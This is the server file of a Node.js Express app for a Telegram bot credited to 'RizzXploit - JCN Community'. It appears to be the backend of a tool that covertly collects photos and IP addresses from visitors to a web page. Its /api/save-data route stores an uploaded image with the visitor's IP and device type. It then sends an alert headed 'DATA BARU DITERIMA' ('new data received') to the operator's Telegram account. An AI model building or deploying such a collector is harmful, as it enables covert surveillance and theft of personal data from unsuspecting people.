require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bot = require('./bot-config');
const db = require('./database/db');
const dataHandler = require('./handlers/data-handler');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Database connection
db.connect();

// Routes
app.get('/', (req, res) => {
  res.json({ 
    message: '🤖 Freelance Bot Server is Running!',
    author: 'RizzXploit - JCN Community',
    status: 'Active',
    database: 'MySQL'
  });
});

// Webhook route for Telegram
app.post('/webhook', (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// Route untuk terima data dari website
app.post('/api/save-data', async (req, res) => {
  try {
    const { image, user_id, client_info } = req.body;
    
    if (!image || !user_id) {
      return res.status(400).json({ error: 'Missing required data' });
    }

    // Simpan data ke database
    const result = await dataHandler.saveData(user_id, image, client_info);
    
    if (result.success) {
      // Kirim notifikasi ke Telegram
      const caption = `🚨 **DATA BARU DITERIMA**\n\n` +
                     `📍 **IP:** \`${client_info.ip}\`\n` +
                     `📱 **Device:** ${client_info.deviceType}\n` +
                     `👤 **Dari User:** ${user_id}\n` +
                     `🕒 **Waktu:** ${new Date().toLocaleString('id-ID')}`;
      
      // Kirim ke Telegram (optional)
      try {
        await global.bot.sendMessage(user_id, caption, { parse_mode: 'Markdown' });
      } catch (telegramError) {
        console.log('Cannot send Telegram notification:', telegramError.message);
      }
      
      res.json({ success: true, message: 'Data saved successfully' });
    } else {
      res.status(500).json({ error: result.error });
    }
    
  } catch (error) {
    console.error('Error saving data:', error);
    res.status(500).json({ error: error.message });
  }
});

// Set webhook endpoint (untuk setup awal)
app.get('/set-webhook', async (req, res) => {
  try {
    const webhookUrl = `${process.env.WEBHOOK_URL}/webhook`;
    const result = await bot.setWebHook(webhookUrl);
    res.json({ 
      success: true, 
      message: 'Webhook set successfully',
      webhookUrl: webhookUrl,
      result: result
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    database: 'MySQL'
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🤖 Bot by RizzXploit • JCN Community`);
  console.log(`💾 Database: MySQL`);
  console.log(`📍 Health check: http://localhost:${PORT}/health`);
  console.log(`🌐 Webhook setup: http://localhost:${PORT}/set-webhook`);
});

module.exports = app;
